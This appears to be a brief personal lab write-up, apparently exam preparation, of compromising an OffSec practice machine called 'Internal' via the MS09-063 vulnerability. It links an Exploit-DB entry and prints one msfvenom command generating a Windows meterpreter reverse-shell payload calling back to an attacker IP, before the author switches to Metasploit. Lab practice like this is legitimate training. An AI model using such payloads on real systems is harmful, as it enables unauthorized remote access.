# Internal

I start by scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

after looking at the HTTP service i see this:

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

I google this port looking for more informations and end up seeing this:

{% embed url="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-063" %}

So i look up the exploits related to this CVE:

{% embed url="https://www.exploit-db.com/exploits/40280" %}

in the exploit there is a msfvenom command that we need to use to adapt the payload to our rhost:

```
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread  -f python
```

then i replace some stuff in the payload to match the syntax of the payload:

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

after a long time looking into it, the box was really annoying so i decided to stop trying to fix errors in the code i thik i had to convert the exploit to python3 but the offsec VMs are very unreliable and i didn't want to bother myself so i used metasploit &#x20;

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

bruh

decided to look at a writeup online for the manual way, now way i would've managed to do all the steps ATM, will try later on in my prep to go through each step

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
